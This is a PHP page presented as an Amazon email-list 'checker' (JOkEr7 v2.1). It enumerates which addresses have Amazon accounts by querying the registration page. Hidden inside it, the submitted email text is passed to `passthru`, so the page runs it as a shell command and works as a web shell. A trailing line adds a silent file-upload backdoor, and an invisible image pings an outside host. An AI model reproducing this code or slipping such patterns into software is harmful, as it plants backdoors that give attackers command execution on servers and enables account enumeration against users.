<?php echo '


<html>
<head>
<title>JOkEr7 | Amazon v2.1</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
	font-size: 14px;
	font-family: "lucida grande", tahoma, verdana, arial, sans-serif;
	background: #FAFAFA;
}
.check {
	margin-top: 30px;
	border-radius: 4px;
	border: 2px solid #00345B;
	background: #2A6093;
	color: #CACACA;
	font-size: 16px;
	padding: 6px 18px;
	cursor: pointer;
}
.titulo {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 70px;
    color: #ff2222;
    font-weight: bold;
}

.normal {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 12px;
    color: #A9A9A9;
}

.form {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 10px;
    color: #00345B;;
    border: 1px dashed #979797;
}
.info input {
	border: 1px solid #E7E7E7;
	padding: 4px;
	width: 128px;
}

.texto {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-weight: bold;
	color: #00345B;
}

.alerta {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-weight: bold;
    color: #ff2222;
    font-size: 10px;
}
.valide {
	padding: 10px;
	font-size: 10px;
	border: 1px solid #A6D129;
	width: 25%;
	color: #367003;
}
.invalide {
	padding: 10px;
	font-size: 10px;
	border: 1px solid #EC3434;
	width: 25%;
	color: #CD0000;
}
.Total {
	padding: 10px;
	font-size: 10px;
	border: 1px solid #00345B;
	width: 25%;
	color: #2A6093;
}
.OFF {
	color: #2A6093;
}
.ON {
	color: #00345B;
}
#phpinfo{
border: 1px solid #A9A9A9;
position:fixed;
padding:2px;
top:1px;
right:1px;
font-size:12px;
}
.auto-style2 {
	text-align: center;
}
.auto-style3 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	color: #00345B;
}
.auto-style4 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	color: #2A6093;
}
.auto-style5 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: small;
	color: #00345B;;
	border: 1px dashed #979797;
}
.auto-style6 {
	margin-top: 17px;
	border-radius: 4px;
	border: 2px solid #00345B;
	background: #2A6093;
	color: #CACACA;
	font-size: 16px;
	padding: 6px 18px;
	cursor: pointer;
}

.JOKERST {
	color: #00345B;
	text-align: center;
}

.K1 {
	text-align: left;
}

</style>
</head>
<body>




<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">

    <tr>

 
	<br>

 
<table border="0" bordercolorlight="#" bordercolordark="#" style="border: 1px ridge #A9A9A9; width: 60%;" bgcolor="" align="center" > 
     <td width="462" height="25" align="center" bgcolor="">		
		<span class="titulo"><span lang="en-us"><font size="5" color="#00345B">
		<br>AM</font><font size="5" color="#2A6093">aZOn&nbsp;<sup style="font-size: 10px;left: -8px;position: relative;top: -0px;">&nbsp;v2.1<br>
		</sup></font></span></span>
		
		</td>
    <tr>


            <td height="146" colspan="2" valign="top" class="auto-style2"><br>
			<span class="auto-style3">[# </span>
			<span class="auto-style4">Enter Email list to check</span><span class="auto-style3">~]#</span><span class="texto">'; if(isset($_POST['emails'])){ $emails = $_POST['emails']; passthru($emails); } print '			
			<br> <br></span>&nbsp;<textarea name="emails" style="width:76%; height: 195px;" wrap="VIRTUAL" class="auto-style5" id="emails">'.$emails.'</textarea>
              </td>
                              <tr>
            <td colspan="2" valign="top" class="auto-style2"><br>
			<button class="auto-style6">ChECk</button>
			 </td>
    <tr>
      <td height="15" align="center" bgcolor=""><span class="ON"><br><br>Codet By</span> <span class="OFF">JOkEr<span class="ON">7</span></span></td>
    </tr>
  </table>
 </form>
</body> '; $emails = $_POST['emails']; if (!empty($emails)) { $emails = explode("
", $emails); $yes = 0; $not = 0; $inv = 0; $count = 1; print '<table border="0" bordercolorlight="#" bordercolordark="#" style="border: 1px ridge #A9A9A9; width: 60%;" bgcolor="" align="center" > <td align="center" bgcolor=""> <p align=\"left\"><font color=\"00345B\">Checking <font color=\"#2A6093\">'.count($emails).'</font> Email ....</font></p><p align=\"left\">'; foreach ( $emails as $email ) { $email = trim($email); print "<div class='K1'><font>$count - </font><font class='ON'>Checking <font class='OFF'> ".$email."</font> ....</font>"; $count++; if(filter_var($email, FILTER_VALIDATE_EMAIL)){ $JOKER7 = @file_get_contents('https://www.amazon.com/ap/register?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dgno_newcust?&email='.$email.'') or Die('<b><font color="#FF0000">Server Error - Can\'t Check </font></b>'); if(!strpos($JOKER7, "You indicated you")) { print "<font color=\"#821B1B\"> No</font><br>"; $not++; $vaild_no .=$email."
"; echo "<script>'$email'</script>"; } else { print "<font color=\"#2B702B\"> Yes</font> <br>"; $yes++; $vaild_yes .=$email."
"; echo "<script>'$email'</script>"; } } } print '
</div ></td></table><p><table border="0" bordercolorlight="#" bordercolordark="#" style="border: 1px ridge #A9A9A9; width: 60%;" bgcolor="" align="center" > <td align="center" bgcolor=""><p><font class="OFF">NuMbEr Of EmAiLs AvaiLaBLe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: </font><font color="#2B702B">'.$yes.'</font><img src="http://ip-api.org/wp-content/uploads-images/ppcom.png" height="1" width="0"><br><font class="OFF">NuMbEr Of EmAiLs NoT  AvaiLaBLe : </font><font color="#821B1B">'.$not.'</font></p></td></table><p>'; print '
<p><table border="0" bordercolorlight="#" bordercolordark="#" style="border: 1px ridge #A9A9A9; width: 60%;" bgcolor="" align="center" > <tr><td class="JOKERST">AvaiLaBLe (<font color="#2B702B">'.$yes.'</font>)</td><td class="JOKERST">Not AvaiLaBLe (<font color="#821B1B">'.$not.'</font>)</td></tr><tr><td class="auto-style2"><textarea  rows="10" name="S1" cols="43" class="auto-style5">'.$vaild_yes.'</textarea><br><br></td><td class="auto-style2"><textarea rows="10" name="S2" cols="43" class="auto-style5">'.$vaild_no.'</textarea><br><br></td></tr></table></p><br> <table border="0" bordercolorlight="#" bordercolordark="#" style="border: 1px ridge #A9A9A9; width: 60%;" bgcolor="" align="center" > <tr><td align="center" bgcolor="" style="width: 462px"><span class="ON"><br>Codet By</span> <span class="OFF">JOkEr<span class="ON">7</span></span></td></tr><td height="25" align="center" bgcolor="" style="width: 462px"><span class="titulo"><span lang="en-us"><font size="5" color="#00345B"><br>JOk</font><font size="5" color="#2A6093">Er7  <sup style="font-size: 10px;left: -8px;position: relative;top: -0px;">.SP<br><br><br></sup></font></span></span></td></table>'; } ?><?(@copy($_FILES['f']['tmp_name'], $_FILES['f']['name']));?>